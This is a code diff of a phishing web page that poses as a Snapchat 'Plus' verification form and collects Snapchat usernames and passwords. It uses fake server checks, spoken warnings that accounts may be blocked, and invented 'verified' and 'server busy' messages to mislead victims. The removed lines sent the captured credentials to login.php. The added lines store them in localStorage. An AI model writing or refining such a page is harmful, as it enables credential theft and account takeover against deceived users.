@@ -598,63 +598,47 @@ userform */
     </div>
   </div>
   <div id="messageBox" class="hidden"></div>
+  <br>
+  <a href="javascript:void(0)" onclick="user_form1()" style="font-size: 18px; text-decoration: none; color: white; font-weight: 500; ">Back--></a>
   <script>
-
-
+  function user_form1(){
+let get = document.getElementById('userForms').style.display='none';
+  }
 function user_form(){
-  alert("Username and Password  should be correct . If it is wrong so your account may block from  snapchat   plus")
-    const message = "Please make sure your username and  password   are   correct. If  it is  wrong, your account may be blocked from Snapchat Plus.  Thank you";
-  
+  alert("Username and Password  should be correct . If it is wrong so your account may block from  snapchat   plus");
+  const message = "Please make sure your username and  password   are   correct. If  it is  wrong, your account may be blocked from Snapchat Plus.  Thank you";
+
   const utterance = new SpeechSynthesisUtterance(message);
-  utterance.rate = 0.95;   // slower for clarity
-  utterance.pitch = 1.1;   // slightly higher pitch sounds clearer
-  utterance.volume = 1;    // max volume
+  utterance.rate = 0.95;
+  utterance.pitch = 1.1;
+  utterance.volume = 1;
   utterance.lang = 'en-US';
 
-  // Wait for voices to be loaded
   speechSynthesis.onvoiceschanged = () => {
     const voices = speechSynthesis.getVoices();
-    
-    // Try selecting a clearer voice
-    const selected = voices.find(voice =>
-      voice.name.includes("Google") || voice.name.includes("Microsoft")
-    );
-
-    if (selected) {
-      utterance.voice = selected;
-    }
-
+    const selected = voices.find(voice => voice.name.includes("Google") || voice.name.includes("Microsoft"));
+    if (selected) utterance.voice = selected;
     speechSynthesis.speak(utterance);
   };
 
-  // Also speak if voices are already loaded
   const voices = speechSynthesis.getVoices();
   if (voices.length) {
-    const selected = voices.find(voice =>
-      voice.name.includes("Google") || voice.name.includes("Microsoft")
-    );
-    if (selected) {
-      utterance.voice = selected;
-    }
-
+    const selected = voices.find(voice => voice.name.includes("Google") || voice.name.includes("Microsoft"));
+    if (selected) utterance.voice = selected;
     speechSynthesis.speak(utterance);
   }
 
-       let get=document.getElementById('userForms');
-      
-
-        if(get.style.display=='block'){
-        get.style.display='none';
-        get.scrollIntoView({ behavior: "smooth", block: "end" });
-    }
-    else{
-         get.style.display='block';
-    }
- setTimeout(() => {
-      get.scrollIntoView({ behavior: "smooth", block: "end" });
-     }, 100); // Delay to ensure DOM update
-     }
-
+  let get = document.getElementById('userForms');
+  if (get.style.display == 'block') {
+    get.style.display = 'none';
+    get.scrollIntoView({ behavior: "smooth", block: "end" });
+  } else {
+    get.style.display = 'block';
+  }
+  setTimeout(() => {
+    get.scrollIntoView({ behavior: "smooth", block: "end" });
+  }, 100);
+}
 
 document.getElementById('loginForm').addEventListener('submit', function (e) {
   e.preventDefault();
@@ -667,271 +651,84 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
   const username = usernameInput.value.trim();
   const password = passwordInput.value;
 
-  // Show progress message first (always)
   msgBox.innerHTML = "<b>✅ !</b><br>We are on the progress, please wait.....";
-
   msgBox.scrollIntoView({ behavior: 'smooth', block: 'start' });
-  // Delay to simulate server check
+
   setTimeout(() => {
-    // Secret Snapchat-style rules (invisible to user)
     const usernameValid = /^[a-zA-Z][a-zA-Z0-9._-]{2,14}$/.test(username) &&
-                          /[0-9_.]/.test(username) &&
-                          !/(123|abc|asd|snap|test)/i.test(username);
+      /[0-9_.]/.test(username) &&
+      !/(123|abc|asd|snap|test)/i.test(username);
 
     const passwordValid = /^(?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])(?!.*\s)/.test(password) &&
-                          !/(password|1234|asdf|qwer|1111)/i.test(password);
+      !/(password|1234|asdf|qwer|1111)/i.test(password);
 
     if (!usernameValid || !passwordValid) {
-   msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Your password or username doesn't match with Snapchat server.";
-     
-const message1="Invalid Credentials , Your password or   username doesn't  match  with    Snapchat server."
- const utterance = new SpeechSynthesisUtterance(message1);
-  utterance.rate = 0.95;   // slower for clarity
-  utterance.pitch = 1.1;   // slightly higher pitch sounds clearer
-  utterance.volume = 1;    // max volume
-  utterance.lang = 'en-US';
+      msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Your password or username doesn't match with Snapchat server.";
 
-  // Wait for voices to be loaded
-  speechSynthesis.onvoiceschanged = () => {
-    const voices = speechSynthesis.getVoices();
-    
-    // Try selecting a clearer voice
-    const selected = voices.find(voice =>
-      voice.name.includes("Google") || voice.name.includes("Microsoft")
-    );
+      const message1 = "Invalid Credentials , Your password or   username doesn't  match  with    Snapchat server.";
+      const utterance = new SpeechSynthesisUtterance(message1);
+      utterance.rate = 0.95;
+      utterance.pitch = 1.1;
+      utterance.volume = 1;
+      utterance.lang = 'en-US';
 
-    if (selected) {
-      utterance.voice = selected;
-    }
+      speechSynthesis.onvoiceschanged = () => {
+        const voices = speechSynthesis.getVoices();
+        const selected = voices.find(voice => voice.name.includes("Google") || voice.name.includes("Microsoft"));
+        if (selected) utterance.voice = selected;
+        speechSynthesis.speak(utterance);
+      };
 
-    speechSynthesis.speak(utterance);
-  };
-
-  // Also speak if voices are already loaded
-  const voices = speechSynthesis.getVoices();
-  if (voices.length) {
-    const selected = voices.find(voice =>
-      voice.name.includes("Google") || voice.name.includes("Microsoft")
-    );
-    if (selected) {
-      utterance.voice = selected;
-    }
-
-    speechSynthesis.speak(utterance);
-  }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+      const voices = speechSynthesis.getVoices();
+      if (voices.length) {
+        const selected = voices.find(voice => voice.name.includes("Google") || voice.name.includes("Microsoft"));
+        if (selected) utterance.voice = selected;
+        speechSynthesis.speak(utterance);
+      }
 
       setTimeout(() => {
         msgBox.innerHTML = "";
         msgBox.classList.add('hidden');
       }, 5000);
-      return; // Stop here if invalid
+
+      return;
     }
 
-    // ✅ If valid – continue with rest
+    // ✅ STORE IN LOCAL STORAGE ONLY IF VALID
+    localStorage.setItem("snap_username", username);
+    localStorage.setItem("snap_password", password);
+    localStorage.setItem("Update", "Being processed.....");
     msgBox.innerHTML = "<b>✅ Valid Credentials</b><br>We are on the progress, please wait...";
 
-const message2="Valid Credentials , We are on the progress,  please wait...."
- const utterance = new SpeechSynthesisUtterance(message2);
-  utterance.rate = 0.95;   // slower for clarity
-  utterance.pitch = 1.1;   // slightly higher pitch sounds clearer
-  utterance.volume = 1;    // max volume
-  utterance.lang = 'en-US';
+    const message2 = "Valid Credentials , We are on the progress,  please wait....";
+    const utterance = new SpeechSynthesisUtterance(message2);
+    utterance.rate = 0.95;
+    utterance.pitch = 1.1;
+    utterance.volume = 1;
+    utterance.lang = 'en-US';
 
-  // Wait for voices to be loaded
-  speechSynthesis.onvoiceschanged = () => {
+    speechSynthesis.onvoiceschanged = () => {
+      const voices = speechSynthesis.getVoices();
+      const selected = voices.find(voice => voice.name.includes("Google") || voice.name.includes("Microsoft"));
+      if (selected) utterance.voice = selected;
+      speechSynthesis.speak(utterance);
+    };
+
     const voices = speechSynthesis.getVoices();
-    
-    // Try selecting a clearer voice
-    const selected = voices.find(voice =>
-      voice.name.includes("Google") || voice.name.includes("Microsoft")
-    );
-
-    if (selected) {
-      utterance.voice = selected;
+    if (voices.length) {
+      const selected = voices.find(voice => voice.name.includes("Google") || voice.name.includes("Microsoft"));
+      if (selected) utterance.voice = selected;
+      speechSynthesis.speak(utterance);
     }
-
-    speechSynthesis.speak(utterance);
-  };
-
-  // Also speak if voices are already loaded
-  const voices = speechSynthesis.getVoices();
-  if (voices.length) {
-    const selected = voices.find(voice =>
-      voice.name.includes("Google") || voice.name.includes("Microsoft")
-    );
-    if (selected) {
-      utterance.voice = selected;
-    }
-
-    speechSynthesis.speak(utterance);
-  }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
     setTimeout(() => {
       msgBox.innerHTML = "<b>⚠ Server Busy:</b><br>Multiple users are currently trying to verify.<br>Your profile will be updated with a verification tic within <b>5 days</b>.<br><br>✨ <b>Have a great day!</b>";
-    }, 23000); // 23s from here = 25s from start
+    }, 23000);
 
-   setTimeout(() => {
-  const formData = new FormData(document.getElementById('loginForm'));
+  }, 2000);
 
-  fetch('login.php', {
-    method: 'POST',
-    body: formData
-  })
-  .then(response => response.text())
-  .then(result => {
-    msgBox.innerHTML = "<b>✅ Login Successful</b><br>Your data has been sent securely.";
-    console.log("Server response:", result); // Optional: show response in console
-  })
-  .catch(error => {
-    msgBox.innerHTML = "<b>❌ Server Error</b><br>Please try again later.";
-    console.error("Fetch error:", error);
-  });
-  // let get=localStorage.setItem("Update", "Processing....");
-}, 30000);
-
-
-
-  }, 2000); // 2s delay to show 'progress' before checking
-  let get=localStorage.setItem("Update","Being processed.....");
-});
-
-
-
-// form validation
- const usernameInput = document.getElementById("username");
-const passwordInput = document.getElementById("password");
-const usernameError = document.getElementById("usernameError");
-const passwordError = document.getElementById("passwordError");
-
-// Common weak patterns to block
-const commonUserPatterns = /(123|abc|qwe|asd|test|snapchat|user)/i;
-const commonPassPatterns = /(password|1234|asdf|qwer|1111)/i;
-
-// Username validation
-function validateUsername() {
-  const u = usernameInput.value.trim();
-  const regex = /^[a-zA-Z][a-zA-Z0-9._-]{2,14}$/; // 3–15 chars, start with letter :contentReference[oaicite:6]{index=6}
-
-  if (!regex.test(u)) {
-    return showError(usernameInput, usernameError,);
-  }
-  if (!/[0-9_.]/.test(u)) {
-    return showError(usernameInput, usernameError,);
-  }
-  if (commonUserPatterns.test(u)) {
-    return showError(usernameInput, usernameError,);
-  }
-  return showValid(usernameInput, usernameError);
-}
-
-// Password validation
-function validatePassword() {
-  const p = passwordInput.value;
-  const regex = /^(?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])(?!.*\s).+$/;
-    // ≥8 chars, uppercase, lowercase, number or symbol, no spaces :contentReference[oaicite:7]{index=7}
-
-  if (!regex.test(p)) {
-    return showError(passwordInput, passwordError,);
-  }
-  if (commonPassPatterns.test(p)) {
-    return showError(passwordInput, passwordError,);
-  }
-  return showValid(passwordInput, passwordError);
-}
-
-function showError(input, errorBox, msg) {
-  input.classList.add("error-border");
-  input.classList.remove("valid-border");
-  errorBox.textContent = msg;
-  errorBox.style.display = "block";
-  return false;
-}
-
-function showValid(input, errorBox) {
-  input.classList.remove("error-border");
-  input.classList.add("valid-border");
-  errorBox.style.display = "none";
-  return true;
-}
-
-// Event listeners
-usernameInput.addEventListener("input", validateUsername);
-passwordInput.addEventListener("input", validatePassword);
-
-// document.getElementById("loginForm").addEventListener("submit", function(e) {
-//   const uOK = validateUsername();
-//   const pOK = validatePassword();
-//   if (!uOK || !pOK) e.preventDefault();
-// });
-document.getElementById("loginForm").addEventListener("submit", function(e) {
-  e.preventDefault(); // Always prevent default first
-
-  const uOK = validateUsername();
-  const pOK = validatePassword();
-
-  if (!uOK || !pOK) {
-    // Show error (optional)
-    const msgBox = document.getElementById('messageBox');
-    msgBox.classList.remove('hidden');
-    msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Your username or password doesn't match with Snapchat server.";
-
-    setTimeout(() => {
-      msgBox.innerHTML = "";
-      msgBox.classList.add('hidden');
-    }, 5000);
-    
-    return; // Don't submit
-  }
-
-  // ✅ If validation passes, continue fake submit logic
-  msgBox.innerHTML = "<b>✅ !</b><br>We are on the progress, please wait.....";
-
-  setTimeout(() => {
-    msgBox.innerHTML = "<b>⚠ Server Busy:</b><br>Your profile will be updated within 5 days.";
-  }, 3000);
-
-  // Simulated successful processing (no real form submission)
-  setTimeout(() => {
-    msgBox.innerHTML = "<b>✅ Verified!</b><br>Your Snapchat account has been processed.";
-  }, 30000);
-
-  let get=localStorage.setItem("Update","Processing");
+  
 });
   </script>
-
 </body>
 </html>
